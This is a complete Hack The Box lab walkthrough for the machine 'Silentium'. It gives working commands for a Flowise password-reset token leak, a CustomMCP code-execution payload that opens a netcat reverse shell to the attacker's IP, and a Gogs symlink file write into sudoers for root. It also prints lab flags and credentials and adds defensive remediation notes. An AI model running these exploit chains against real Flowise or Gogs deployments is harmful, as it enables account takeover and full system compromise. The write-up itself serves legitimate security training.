---
title: "HTB Silentium — Complete Walkthrough"
aliases:
  - "Silentium HTB"
  - "HTB Silentium Writeup"
tags:
  - htb
  - linux
  - web
  - flowise
  - docker
  - gogs
  - cve-2025-8110
  - privilege-escalation
  - arbitrary-file-write
  - rce
platform: Hack The Box
machine: Silentium
operating_system: Linux
status: Rooted
target_ip: 10.129.71.50
attacker_ip: 10.10.14.154
created: 2026-07-16
---

# HTB Silentium — Complete Walkthrough

> [!danger] Spoiler warning
> This document contains the full exploitation chain, credentials discovered during the lab, and both flags for the Hack The Box machine **Silentium**.

---

## 1. Executive Summary

Silentium was a Linux web machine built around a vulnerable Flowise deployment and a locally exposed Gogs instance. The compromise began with service enumeration and vhost discovery. The staging Flowise instance was identified as version `3.0.5`, which exposed a vulnerable password-reset workflow and a vulnerable CustomMCP node path.

The attack chain was:

1. Enumerate `silentium.htb` and discover `staging.silentium.htb`.
2. Confirm Flowise `3.0.5` through `/api/v1/version`.
3. Identify a valid Flowise account: `ben@silentium.htb`.
4. Abuse the Flowise forgot-password response to leak a valid `tempToken`.
5. Reset the Flowise admin password and authenticate to the dashboard.
6. Exploit Flowise CustomMCP `mcpServerConfig` JavaScript evaluation for command execution.
7. Catch a root shell inside the Flowise Docker container.
8. Enumerate container environment variables and recover credentials.
9. SSH into the host as `ben` using the recovered SMTP password.
10. Identify Gogs running locally as `root` on `127.0.0.1:3001`.
11. Register a Gogs account and generate an API token.
12. Abuse the Gogs symlink arbitrary-file-write vulnerability to write `/etc/sudoers.d/ben-root`.
13. Use passwordless sudo to become root on the host.

Final result:

| Stage | Result |
|---|---|
| Initial web foothold | Flowise admin takeover |
| Container access | Root shell inside Flowise container |
| Host foothold | SSH as `ben` |
| Host privesc | Gogs arbitrary file write into sudoers |
| Final access | Host root |

---

## 2. Target Profile

| Item | Value |
|---|---|
| Machine | `Silentium` |
| Target IP | `10.129.71.50` |
| Primary domain | `silentium.htb` |
| Flowise vhost | `staging.silentium.htb` |
| Gogs vhost | `staging-v2-code.dev.silentium.htb` |
| Attacker VPN IP | `10.10.14.154` |
| SSH user obtained | `ben` |
| User flag | `59622d7fa1d0ac84e1bb220f039856a3` |
| Root flag | `2127397e693752b33e68a58b3dfaf0a5` |

Local `/etc/hosts` entries used during the machine:

```text
10.129.71.50 silentium.htb staging.silentium.htb
127.0.0.1 staging-v2-code.dev.silentium.htb
```

The Gogs vhost was mapped to `127.0.0.1` on the attacker box because it was accessed through an SSH local port forward.

---

## 3. Attack Path Diagram

```mermaid
flowchart TD
    A["Nmap: 22/tcp SSH, 80/tcp HTTP"] --> B["Vhost discovery"]
    B --> C["staging.silentium.htb"]
    C --> D["Flowise 3.0.5"]
    D --> E["Forgot-password tempToken leak"]
    E --> F["Reset ben@silentium.htb admin password"]
    F --> G["Authenticated Flowise dashboard"]
    G --> H["CustomMCP mcpServerConfig RCE"]
    H --> I["Root shell inside Flowise container"]
    I --> J["Environment variable disclosure"]
    J --> K["SSH as ben using r04D!!_R4ge"]
    K --> L["Gogs running locally as root"]
    L --> M["Register Gogs user + API token"]
    M --> N["Symlink file write to /etc/sudoers.d/ben-root"]
    N --> O["sudo -n /bin/bash"]
    O --> P["Host root"]
```

---

## 4. Reconnaissance

### 4.1 Nmap scan

Initial service scan:

```bash
nmap -sC -sV 10.129.71.50
```

Result:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

Only SSH and HTTP were externally exposed. The HTTP service redirected to `silentium.htb`, so the hostname was added to `/etc/hosts`.

```bash
echo '10.129.71.50 silentium.htb' | sudo tee -a /etc/hosts
```

### 4.2 Vhost and directory enumeration

Subdomain enumeration discovered:

```text
staging.silentium.htb
```

The vhost was added as well:

```bash
echo '10.129.71.50 staging.silentium.htb' | sudo tee -a /etc/hosts
```

Browsing to the vhost showed a Flowise sign-in page:

```text
http://staging.silentium.htb/signin
```

This became the initial exploitation surface.

---

## 5. Flowise Enumeration

### 5.1 Frontend JavaScript scraping

The sign-in page was scraped for JavaScript assets, API routes, and email addresses:

```bash
export URL='http://staging.silentium.htb'

curl -s "$URL/signin" \
  | tee /tmp/silentium.html \
  | sed -nE 's/.*src="([^"]+\.js)".*/\1/p' \
  | while read js; do curl -s "$URL/${js#/}"; done \
  | tee /tmp/silentium.js >/dev/null

grep -Eaio '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' \
  /tmp/silentium.html /tmp/silentium.js | sort -u
```

Observed email from static assets:

```text
hello@flowiseai.com
```

This was only a default Flowise contact address, not a valid target account.

API path extraction showed only a small frontend-visible surface:

```bash
grep -Eao '/api/v1/[A-Za-z0-9_./-]+' /tmp/silentium.js | sort -u
```

```text
/api/v1/auth/refreshToken
/api/v1/version
```

### 5.2 Flowise version check

The backend version endpoint confirmed Flowise `3.0.5`:

```bash
curl -i -s "$URL/api/v1/version"
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"version":"3.0.5"}
```

This version was important because the machine exposed two relevant Flowise issues:

| Issue | Impact |
|---|---|
| Forgot-password tempToken disclosure | Account takeover |
| CustomMCP `mcpServerConfig` evaluation | Command execution inside the Flowise container |

---

## 6. Flowise Account Takeover

### 6.1 Valid account discovery

A valid account was identified from the website/context:

```text
ben@silentium.htb
```

The forgot-password endpoint returned the full user object, including the password hash and a valid reset token:

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

Important fields:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "I3uB3FvKIb8nfYRS6t38wCY5HhqeuKkrODf42e31eyJEbBzmKMlMfZyhoUCKgsim",
    "status": "active"
  }
}
```

The token expired quickly, so a fresh token was requested immediately before resetting the password.

### 6.2 Password reset

```bash
export URL='http://staging.silentium.htb'
export EMAIL='ben@silentium.htb'
export PASS='SilentiumPass123!'

export TOKEN=$(curl -s -X POST "$URL/api/v1/account/forgot-password" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":{\"email\":\"$EMAIL\"}}" \
  | jq -r '.user.tempToken')
```

An initial attempt using the field name `credential` failed:

```bash
curl -i -s -X POST "$URL/api/v1/account/reset-password" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$TOKEN\",\"credential\":\"$PASS\"}}"
```

Response:

```json
{
  "statusCode": 500,
  "success": false,
  "message": "Transaction is not started yet, start transaction before committing or rolling it back."
}
```

The correct field was `password`:

```bash
curl -i -s -X POST "$URL/api/v1/account/reset-password" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$TOKEN\",\"password\":\"$PASS\"}}"
```

Successful response:

```http
HTTP/1.1 201 Created
```

The returned object showed the user remained active and the `tempToken` had been cleared.

### 6.3 Authenticated session

A browser login was then possible with:

```text
Email:    ben@silentium.htb
Password: SilentiumPass123!
```

A session was also saved from the CLI:

```bash
curl -i -s -c /tmp/flowise.cookies \
  -X POST "$URL/api/v1/auth/login" \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
  | tee /tmp/flowise-login.txt
```

The authenticated response showed:

```json
{
  "email": "ben@silentium.htb",
  "name": "admin",
  "isOrganizationAdmin": true,
  "activeWorkspace": "Default Workspace",
  "permissions": ["organization", "workspace"]
}
```

---

## 7. Flowise CustomMCP RCE

### 7.1 RCE test through HTTP callback

The vulnerable endpoint was:

```text
/api/v1/node-load-method/customMCP
```

The attack used a JavaScript Immediately Invoked Function Expression inside `mcpServerConfig` to load Node.js `child_process` and execute a command.

A quick callback test was performed first.

Attacker terminal:

```bash
cd /tmp && python3 -m http.server 8000
```

Payload command:

```bash
export CMD='curl http://10.10.14.154:8000/rce-$(id|base64 -w0)'
```

Request:

```bash
jq -nc --arg cmd "$CMD" \
'{loadMethod:"listActions",inputs:{mcpServerConfig:"({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.execSync(" + ($cmd|@json) + ");return 1;})()})"}}' \
| curl -i -s -b /tmp/flowise.cookies \
  -X POST "$URL/api/v1/node-load-method/customMCP" \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  --data-binary @-
```

The HTTP server received:

```text
GET /rce-dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksMChyb290KSwxKGJpbiksMihkYWVtb24pLDMoc3lzKSw0KGFkbSksNihkaXNrKSwxMCh3aGVlbCksMTEoZmxvcHB5KSwyMChkaWFsb3V0KSwyNih0YXBlKSwyNyh2aWRlbykK HTTP/1.1
```

Decoded:

```bash
echo 'dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksMChyb290KSwxKGJpbiksMihkYWVtb24pLDMoc3lzKSw0KGFkbSksNihkaXNrKSwxMCh3aGVlbCksMTEoZmxvcHB5KSwyMChkaWFsb3V0KSwyNih0YXBlKSwyNyh2aWRlbykK' | base64 -d
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

This confirmed command execution as `root` inside the Flowise container.

### 7.2 Reverse shell

The first reverse shell landed in the wrong listener because the Python HTTP server was still bound to port `8000`:

```text
/bin/sh: can't access tty; job control turned off
```

That line appeared in the Python HTTP server logs, proving that the shell connected but was talking to the wrong service.

The fix was to stop the HTTP server and run netcat on the same port.

Attacker terminal:

```bash
rlwrap -cAr nc -lvnp 8000
```

Payload generation:

```bash
export URL='http://staging.silentium.htb'
export LHOST='10.10.14.154'
export LPORT='8000'

python3 - <<'PY' > /tmp/payload.json
import json, os
lhost=os.environ["LHOST"]
lport=os.environ["LPORT"]
cmd=f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
js="({x:(function(){const cp=process.mainModule.require('child_process');cp.exec(%s);return 1;})()})" % json.dumps(cmd)
print(json.dumps({"loadMethod":"listActions","inputs":{"mcpServerConfig":js}}))
PY
```

Trigger:

```bash
curl -i -s -b /tmp/flowise.cookies \
  -X POST "$URL/api/v1/node-load-method/customMCP" \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  --data-binary @/tmp/payload.json
```

Listener result:

```text
listening on [any] 8000 ...
connect to [10.10.14.154] from (UNKNOWN) [10.129.71.50] 41833
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

At this stage, the shell was `root` inside the Flowise Docker container, not root on the host.

---

## 8. Container Enumeration and Credential Discovery

The container filesystem did not contain host flags:

```sh
find /home -name user.txt -type f -print -exec cat {} \; 2>/dev/null
cat /root/root.txt 2>/dev/null
```

No flags were returned.

Environment variables revealed credentials:

```sh
env | sort
```

Important values:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SENDER_EMAIL=ben@silentium.htb
SMTP_HOST=mailhog
SMTP_PASSWORD=r04D!!_R4ge
SMTP_PORT=1025
SMTP_USER=test
SMTP_USERNAME=test
```

The Flowise password did **not** work over SSH, but the SMTP password did.

---

## 9. Host Foothold as Ben

SSH was exposed externally on port `22`, so the recovered credentials were tested against the host.

```bash
ssh -o PubkeyAuthentication=no ben@10.129.71.50
```

Password:

```text
r04D!!_R4ge
```

Successful login:

```text
Welcome to Ubuntu 24.04.4 LTS
ben@silentium:~$
```

The user flag was in Ben's home directory:

```bash
cat ~/user.txt
```

```text
59622d7fa1d0ac84e1bb220f039856a3
```

---

## 10. Host Enumeration

### 10.1 Process inspection

The process list showed Gogs running as root:

```bash
ps aux | grep gogs
```

```text
root  1457  ...  /opt/gogs/gogs/gogs web
```

Other relevant services included Docker, Flowise, MailHog, nginx, and SSH:

```text
root        1530  ... /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
ben         1885  ... MailHog
root        1886  ... node /usr/local/bin/flowise start
root        2214  ... sshd: /usr/sbin/sshd -D
```

### 10.2 Listening ports

```bash
ss -ltnp
```

Important listeners:

```text
127.0.0.1:3000
127.0.0.1:3001
127.0.0.1:8025
127.0.0.1:1025
0.0.0.0:22
0.0.0.0:80
```

Gogs was listening locally on port `3001`.

### 10.3 Gogs configuration

The configuration file was readable:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Key values:

```ini
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db

[repository]
ROOT_PATH      = /root/gogs-repositories
ROOT           = /root/gogs-repositories

[auth]
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
```

The important observation was that Gogs was running as `root` and repository data was stored under `/root/gogs-repositories`. That made any server-side arbitrary file write through Gogs root-equivalent.

---

## 11. Accessing Local Gogs

A local port forward was created from the attacker machine:

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@10.129.71.50
```

The attacker `/etc/hosts` file was updated:

```bash
echo '127.0.0.1 staging-v2-code.dev.silentium.htb' | sudo tee -a /etc/hosts
```

Gogs was then accessible locally:

```text
http://staging-v2-code.dev.silentium.htb:3001
```

Existing credentials did not work for Gogs. However, registration was enabled, so a new user was created manually through the web UI.

Created account:

```text
Username: iqbal
Email:    iqbal@gmail.com
```

A personal access token was generated from:

```text
Settings -> Applications -> Generate New Token
```

Token:

```text
085500299dd34de340bb8688e45a9cf46ed8a8a8
```

The token was verified with the API:

```bash
export BASE='http://staging-v2-code.dev.silentium.htb:3001'
export TOKEN='085500299dd34de340bb8688e45a9cf46ed8a8a8'

curl -s -H "Authorization: token $TOKEN" "$BASE/api/v1/user" | jq .
```

Response:

```json
{
  "id": 2,
  "username": "iqbal",
  "login": "iqbal",
  "email": "iqbal@gmail.com"
}
```

---

## 12. Root via Gogs Arbitrary File Write

### 12.1 Vulnerability concept

The Gogs vulnerability abused here is a symlink handling issue in the repository contents API. The attack flow is:

1. Create a repository.
2. Commit a symlink inside the repository pointing to a sensitive host path.
3. Use the Gogs contents API to update the symlink path.
4. Gogs follows the symlink and writes outside the repository.
5. Because Gogs runs as `root`, the file write is performed as `root`.

The chosen target file was:

```text
/etc/sudoers.d/ben-root
```

The intended content was:

```text
ben ALL=(ALL) NOPASSWD:ALL
```

Once written, Ben could execute any command through sudo without a password.

### 12.2 Create a repository

```bash
export OWNER=$(curl -s -H "Authorization: token $TOKEN" "$BASE/api/v1/user" | jq -r '.username')
export REPO="pwnroot$(date +%s)"

curl -s -X POST "$BASE/api/v1/user/repos" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$REPO\",\"private\":false,\"auto_init\":false}" \
  | jq .
```

Created repository:

```text
iqbal/pwnroot1784179411
```

### 12.3 Commit a symlink to sudoers

```bash
rm -rf "/tmp/$REPO"
mkdir "/tmp/$REPO"
cd "/tmp/$REPO"

git init -b master
git config user.name "$OWNER"
git config user.email "$OWNER@silentium.htb"

ln -s /etc/sudoers.d/ben-root sudoerslink

git add sudoerslink
git commit -m 'add symlink'
git remote add origin "http://$OWNER:$TOKEN@staging-v2-code.dev.silentium.htb:3001/$OWNER/$REPO.git"
git push -u origin master
```

Successful push:

```text
[new branch]      master -> master
branch 'master' set up to track 'origin/master'.
```

### 12.4 Write the sudoers file through the symlink

Get the symlink SHA:

```bash
export SHA=$(git ls-tree HEAD sudoerslink | awk '{print $3}')
```

Build the API payload:

```bash
python3 - <<'PY' > /tmp/update-sudoers.json
import os, json, base64
content = base64.b64encode(b"ben ALL=(ALL) NOPASSWD:ALL\n").decode()
print(json.dumps({
    "message": "update sudoers through symlink",
    "content": content,
    "branch": "master",
    "sha": os.environ["SHA"]
}))
PY
```

Send the PUT request:

```bash
curl -i -s -X PUT "$BASE/api/v1/repos/$OWNER/$REPO/contents/sudoerslink" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/update-sudoers.json
```

Response:

```http
HTTP/1.1 201 Created
```

The API still described the content as a symlink:

```json
{
  "content": {
    "type": "symlink",
    "target": "/etc/sudoers.d/ben-root",
    "path": "sudoerslink"
  }
}
```

Despite that presentation, the write had modified the symlink target on disk.

### 12.5 Confirm sudoers impact

Back in the SSH session as `ben`:

```bash
sudo -n -l
```

Output:

```text
Matching Defaults entries for ben on silentium:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ben may run the following commands on silentium:
    (ALL) NOPASSWD: ALL
```

Root shell:

```bash
sudo -n /bin/bash
```

Proof:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root flag:

```bash
cat /root/root.txt
```

```text
2127397e693752b33e68a58b3dfaf0a5
```

---

## 13. Flags

| Flag | Value |
|---|---|
| User | `59622d7fa1d0ac84e1bb220f039856a3` |
| Root | `2127397e693752b33e68a58b3dfaf0a5` |

---

## 14. Vulnerability Summary

### 14.1 Flowise password-reset token disclosure

| Field | Detail |
|---|---|
| Component | Flowise account recovery API |
| Endpoint | `/api/v1/account/forgot-password` |
| Weakness | Response disclosed a valid `tempToken` |
| Impact | Account takeover of `ben@silentium.htb` / admin |
| Exploited result | Flowise dashboard access |

The endpoint returned a full user object and a usable password-reset token without requiring email inbox access.

---

### 14.2 Flowise CustomMCP command execution

| Field | Detail |
|---|---|
| Component | Flowise CustomMCP node load method |
| Endpoint | `/api/v1/node-load-method/customMCP` |
| Weakness | Unsafe evaluation of `mcpServerConfig` |
| Impact | JavaScript execution in Node.js backend |
| Exploited result | Root shell inside Flowise container |

The payload used an IIFE inside `mcpServerConfig`:

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('COMMAND_HERE');return 1;})()})"
  }
}
```

The backend evaluated the string and executed commands through `child_process`.

---

### 14.3 Credential disclosure through container environment variables

| Field | Detail |
|---|---|
| Component | Flowise container runtime configuration |
| Weakness | Sensitive credentials stored in environment variables |
| Exposed secrets | Flowise credentials, SMTP credentials, JWT secrets |
| Impact | Host credential reuse |
| Exploited result | SSH as `ben` |

The key credential was:

```text
SMTP_PASSWORD=r04D!!_R4ge
```

This password was reused by the host user `ben`.

---

### 14.4 Gogs arbitrary file write as root

| Field | Detail |
|---|---|
| Component | Gogs repository contents API |
| Local service | `127.0.0.1:3001` |
| Weakness | Symlink target write through repository API |
| Dangerous configuration | `RUN_USER = root` |
| Impact | Host arbitrary file write as root |
| Exploited result | `/etc/sudoers.d/ben-root` created |

The root cause became severe because Gogs was running as root. A file-write primitive turned directly into root compromise.

---

## 15. Troubleshooting Notes

| Symptom | Cause | Fix |
|---|---|---|
| Forgot-password returns `User Not Found` | Invalid email | Use `ben@silentium.htb` |
| Reset with `credential` returns HTTP 500 | Wrong JSON field | Use `password` |
| RCE HTTP response says `No Available Actions` | Flowise action list still fails after command execution | Check listener/callback; command may still execute |
| Reverse shell appears in Python HTTP server logs | HTTP server was still bound to callback port | Stop HTTP server and start `nc` on the same port |
| `/root/root.txt` missing after Flowise RCE | Shell is inside Docker container | Enumerate env vars and pivot to host SSH |
| `F1l3_d0ck3r` fails for SSH | It is the Flowise app password, not host password | Use `r04D!!_R4ge` |
| Gogs login with recovered creds fails | Gogs uses a separate account database | Register a new account; registration is enabled |
| Browser breaks after port-forward | Gogs expects its configured hostname | Add `127.0.0.1 staging-v2-code.dev.silentium.htb` to attacker `/etc/hosts` |
| `cat /root/root.txt` fails as Ben | Ben is not root yet | Run `sudo -n /bin/bash` after sudoers write |

---

## 16. Defensive Remediation

| Finding | Recommended Fix |
|---|---|
| Flowise exposed on staging vhost | Restrict staging systems by VPN/IP allowlist and enforce authentication boundaries |
| Password-reset token disclosure | Upgrade Flowise and ensure reset tokens are never returned in API responses |
| CustomMCP code execution | Upgrade Flowise; never evaluate user-provided JavaScript configuration strings |
| Secrets in environment variables | Move secrets to a managed secret store; rotate leaked credentials |
| Credential reuse | Use unique passwords per service and account |
| Containers running as root | Run containers as non-root users and apply least privilege |
| Gogs running as root | Run Gogs as a dedicated unprivileged service user |
| Gogs registration enabled | Disable public registration on internal code platforms |
| Gogs arbitrary file write | Upgrade Gogs to a patched version and validate symlink behavior in file-write APIs |
| Local services reachable after SSH | Harden internal-only services; assume SSH users can port-forward unless restricted |

---

## 17. Key Lessons

- Staging services often contain the weakest controls and should be treated as production-risk assets.
- Password-reset implementations must never return reset tokens in API responses.
- Node.js features that parse or evaluate configuration strings can become direct RCE primitives.
- Root inside a container is not automatically root on the host, but container environment variables often expose pivot credentials.
- Internal services bound to localhost are still reachable to any user with SSH port-forwarding access.
- Running developer platforms such as Gogs as root turns application-level bugs into host-level compromise.
- A symlink arbitrary-file-write bug becomes immediately critical when the writing process has root privileges.

---

## 18. Clean Command Reference

### Flowise takeover

```bash
export URL='http://staging.silentium.htb'
export EMAIL='ben@silentium.htb'
export PASS='SilentiumPass123!'

export TOKEN=$(curl -s -X POST "$URL/api/v1/account/forgot-password" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":{\"email\":\"$EMAIL\"}}" | jq -r '.user.tempToken')

curl -i -s -X POST "$URL/api/v1/account/reset-password" \
  -H 'Content-Type: application/json' \
  -d "{\"user\":{\"email\":\"$EMAIL\",\"tempToken\":\"$TOKEN\",\"password\":\"$PASS\"}}"

curl -i -s -c /tmp/flowise.cookies \
  -X POST "$URL/api/v1/auth/login" \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}"
```

### Flowise reverse shell

```bash
rlwrap -cAr nc -lvnp 8000
```

```bash
export LHOST='10.10.14.154'
export LPORT='8000'

python3 - <<'PY' > /tmp/payload.json
import json, os
lhost=os.environ["LHOST"]
lport=os.environ["LPORT"]
cmd=f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
js="({x:(function(){const cp=process.mainModule.require('child_process');cp.exec(%s);return 1;})()})" % json.dumps(cmd)
print(json.dumps({"loadMethod":"listActions","inputs":{"mcpServerConfig":js}}))
PY

curl -i -s -b /tmp/flowise.cookies \
  -X POST "$URL/api/v1/node-load-method/customMCP" \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  --data-binary @/tmp/payload.json
```

### SSH as Ben

```bash
ssh -o PubkeyAuthentication=no ben@10.129.71.50
```

Password:

```text
r04D!!_R4ge
```

### Gogs port-forward

```bash
ssh -N -L 3001:127.0.0.1:3001 ben@10.129.71.50
```

### Gogs arbitrary file write

```bash
export BASE='http://staging-v2-code.dev.silentium.htb:3001'
export TOKEN='085500299dd34de340bb8688e45a9cf46ed8a8a8'
export OWNER=$(curl -s -H "Authorization: token $TOKEN" "$BASE/api/v1/user" | jq -r '.username')
export REPO="pwnroot$(date +%s)"

curl -s -X POST "$BASE/api/v1/user/repos" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"$REPO\",\"private\":false,\"auto_init\":false}" | jq .

rm -rf "/tmp/$REPO"
mkdir "/tmp/$REPO"
cd "/tmp/$REPO"

git init -b master
git config user.name "$OWNER"
git config user.email "$OWNER@silentium.htb"
ln -s /etc/sudoers.d/ben-root sudoerslink
git add sudoerslink
git commit -m 'add symlink'
git remote add origin "http://$OWNER:$TOKEN@staging-v2-code.dev.silentium.htb:3001/$OWNER/$REPO.git"
git push -u origin master

export SHA=$(git ls-tree HEAD sudoerslink | awk '{print $3}')
python3 - <<'PY' > /tmp/update-sudoers.json
import os, json, base64
content = base64.b64encode(b"ben ALL=(ALL) NOPASSWD:ALL\n").decode()
print(json.dumps({
    "message": "update sudoers through symlink",
    "content": content,
    "branch": "master",
    "sha": os.environ["SHA"]
}))
PY

curl -i -s -X PUT "$BASE/api/v1/repos/$OWNER/$REPO/contents/sudoerslink" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @/tmp/update-sudoers.json
```

### Become root

```bash
sudo -n -l
sudo -n /bin/bash
id
cat /root/root.txt
```

---

## 19. References

- Flowise forgot-password token disclosure: GitHub Advisory Database entry for `GHSA-wgpv-6j63-x5ph` / `CVE-2025-58434`.
- Flowise CustomMCP RCE: FlowiseAI security advisory `GHSA-3gcm-f6qx-ff7p`.
- Gogs symlink arbitrary file write / `CVE-2025-8110`: public Gogs vulnerability research and writeups covering symlink handling in the PutContents API.

---

## 20. Final Notes

Silentium was a clean web-to-container-to-host chain. The initial compromise came from Flowise authentication and RCE weaknesses, but host root required recognizing that Gogs was locally exposed and running with excessive privileges. The final escalation was not a kernel exploit or brute-force step; it was a precise abuse of an application-level file-write vulnerability amplified by a dangerous service configuration.
